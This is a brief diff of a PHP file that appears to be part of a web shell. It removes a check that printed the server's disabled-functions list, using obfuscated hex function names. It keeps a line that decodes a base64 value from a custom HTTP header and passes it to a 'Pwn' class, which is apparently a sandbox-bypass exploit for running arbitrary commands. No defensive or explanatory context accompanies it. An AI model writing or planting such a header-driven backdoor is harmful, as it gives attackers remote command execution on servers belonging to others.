@@ -1,11 +1,6 @@
 <?php
 
-if (base64_decode($_SERVER['HTTP_AIZAWA_NINJA']) === "disable_functions") {
-    echo (!empty(@"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions')) ? @"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions') : 'NONE');
-    exit;
-} else {
-    new Pwn(base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));
-}
+new Pwn(base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));
 
 class Helper { public $a, $b, $c; }
 class Pwn {
